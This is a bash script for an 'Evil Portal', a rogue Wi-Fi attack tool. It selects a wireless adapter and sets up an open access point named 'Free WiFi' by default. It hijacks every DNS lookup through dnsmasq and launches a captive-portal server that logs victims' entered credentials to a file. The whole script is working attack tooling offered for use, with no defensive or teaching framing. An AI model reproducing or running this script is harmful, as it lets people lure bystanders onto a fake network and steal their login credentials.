#!/bin/bash
# ACID Evil Portal - rogue AP + captive portal credential capture.
# Auto-picks a FREE AP-capable adapter by USB-id (NEVER the SSH/client iface, NEVER the monitor).
# Brings up hostapd (open AP) + dnsmasq (DHCP + DNS hijack -> captive portal) + the portal web server.
# Usage:  acid-evilportal.sh "<SSID>" [channel]     (default channel 6)
# Stop:   touch /tmp/acid_portal_stop
# Run detached: sudo setsid bash /usr/local/bin/acid-evilportal.sh "Free WiFi" 6 </dev/null >/tmp/acid_portal_run.log 2>&1 &
export PATH="/usr/sbin:/usr/bin:/sbin:/bin:$PATH"
SSID="${1:-Free WiFi}"
CH="${2:-6}"
GW=10.0.0.1

echo "[ep] === start $(date '+%H:%M:%S')  SSID='$SSID'  ch=$CH ==="
SSHIF=$(ip -o route show default 2>/dev/null | awk '{print $5; exit}')
echo "[ep] SSH/client iface (protected): $SSHIF"

usbid(){ local dd vid=""; dd=$(readlink -f /sys/class/net/$1/device 2>/dev/null)
  while [ -n "$dd" ] && [ "$dd" != "/" ]; do
    [ -f "$dd/idVendor" ] && { echo "$(cat $dd/idVendor):$(cat $dd/idProduct)"; return; }
    dd=$(dirname "$dd"); done; }
ap_capable(){ local ph; ph=$(cat /sys/class/net/$1/phy80211/name 2>/dev/null)
  iw phy "$ph" info 2>/dev/null | grep -A6 'Supported interface modes' | grep -q '\* AP$'; }

# preference: ACH (RTL8812AU, high power) -> RTL8821AU ; skip SSH iface + monitor
APIF=""
for want in 0bda:8812 2357:0120; do
  for w in $(ls /sys/class/net | grep '^wlan'); do
    [ "$w" = "$SSHIF" ] && continue
    [ "$w" = "wlan0mon" ] && continue
    if [ "$(usbid $w)" = "$want" ] && ap_capable "$w"; then APIF="$w"; break 2; fi
  done
done
if [ -z "$APIF" ]; then
  for w in wlan0; do [ "$w" != "$SSHIF" ] && ap_capable "$w" && { APIF="$w"; break; }; done
fi
[ -z "$APIF" ] && { echo "[ep] ERROR: no free AP-capable adapter found"; exit 1; }
echo "[ep] AP adapter = $APIF (usb $(usbid $APIF))"
echo "Evil Portal AP: $APIF" > /tmp/acid_active_radio 2>/dev/null   # shown in launcher bottom bar

echo "$SSID" > /tmp/acid_portal_ssid
: > /tmp/acid_portal_creds.log
: > /tmp/acid_portal_clients
rm -f /tmp/acid_portal_stop

# clean any prior instance
[ -f /tmp/acid_ep_pids ] && kill $(cat /tmp/acid_ep_pids) 2>/dev/null
pkill -f acid-portal-server.py 2>/dev/null

nmcli dev set "$APIF" managed no 2>/dev/null
sleep 1
ip link set "$APIF" down 2>/dev/null
ip addr flush dev "$APIF" 2>/dev/null
ip link set "$APIF" up 2>/dev/null
ip addr add $GW/24 dev "$APIF" 2>/dev/null

cat > /tmp/acid_hostapd.conf <<EOF
interface=$APIF
driver=nl80211
ssid=$SSID
hw_mode=g
channel=$CH
auth_algs=1
wmm_enabled=1
ignore_broadcast_ssid=0
EOF

cat > /tmp/acid_dnsmasq.conf <<EOF
interface=$APIF
bind-interfaces
except-interface=lo
dhcp-range=10.0.0.50,10.0.0.200,255.255.255.0,12h
dhcp-option=3,$GW
dhcp-option=6,$GW
address=/#/$GW
no-resolv
no-hosts
EOF

hostapd /tmp/acid_hostapd.conf >/tmp/acid_hostapd.log 2>&1 &
HPID=$!
sleep 3
if ! kill -0 $HPID 2>/dev/null; then
  echo "[ep] hostapd FAILED to start:"; tail -6 /tmp/acid_hostapd.log
  ip addr flush dev "$APIF" 2>/dev/null; nmcli dev set "$APIF" managed yes 2>/dev/null
  exit 1
fi

dnsmasq -C /tmp/acid_dnsmasq.conf -d >/tmp/acid_dnsmasq.log 2>&1 &
DPID=$!
python3 /usr/local/bin/acid-portal-server.py >/tmp/acid_portal.log 2>&1 &
WPID=$!
echo "$HPID $DPID $WPID" > /tmp/acid_ep_pids
echo "[ep] UP  hostapd=$HPID dnsmasq=$DPID portal=$WPID  '$SSID' on $APIF @ $GW"

while [ ! -f /tmp/acid_portal_stop ]; do
  sleep 3
  kill -0 $HPID 2>/dev/null || { echo "[ep] hostapd died, exiting"; break; }
done

echo "[ep] stopping..."
kill $HPID $DPID $WPID 2>/dev/null
pkill -f acid-portal-server.py 2>/dev/null
ip addr flush dev "$APIF" 2>/dev/null
ip link set "$APIF" down 2>/dev/null
# KEEP the AP adapter UNMANAGED (do NOT re-manage) so NetworkManager won't try it as a
# client and contend with the SSH iface (that caused hard SSH flapping). It's the AP
# adapter, not a client - leave it out of NM.
nmcli dev set "$APIF" managed no 2>/dev/null
rm -f /tmp/acid_ep_pids /tmp/acid_active_radio
echo "[ep] DONE - $APIF kept unmanaged (NM won't fight it; SSH iface safe)"
